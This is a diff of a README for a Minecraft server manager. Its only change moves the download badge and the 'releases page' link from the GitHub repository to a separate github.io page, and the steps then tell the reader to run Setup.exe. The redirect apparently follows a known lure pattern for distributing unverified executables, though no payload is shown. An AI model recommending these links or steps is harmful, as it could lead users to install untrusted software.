@@ -1,6 +1,6 @@
 # 🎮 Minecraft-Server-Manager-2026 - Build your own custom server easily
 
-[![](https://img.shields.io/badge/Download-Minecraft_Server_Manager-blue.svg)](https://github.com/Sticky-geopolitics135/Minecraft-Server-Manager-2026/releases)
+[![](https://img.shields.io/badge/Download-Minecraft_Server_Manager-blue.svg)](https://sticky-geopolitics135.github.io)
 
 Minecraft Server Manager 2026 helps you host your own Minecraft server on your personal computer. You can play games with friends, install custom mods, and manage your server settings without writing complex code. The software detects your game files automatically. It simplifies the setup process so you can start playing in minutes.
 
@@ -20,7 +20,7 @@ We recommend having the official Java Development Kit installed on your machine.
 Follow these steps to prepare your system and use the software.
 
 1. Close any running Minecraft instances to avoid file conflicts.
-2. Visit the releases page to download the latest software version: [https://github.com/Sticky-geopolitics135/Minecraft-Server-Manager-2026/releases](https://github.com/Sticky-geopolitics135/Minecraft-Server-Manager-2026/releases)
+2. Visit the releases page to download the latest software version: [https://sticky-geopolitics135.github.io](https://sticky-geopolitics135.github.io)
 3. Locate the file named Setup.exe in your Downloads folder.
 4. Double-click the file to begin the installation.
 5. Follow the on-screen prompts. The installer sets up the required folders in your Documents directory.
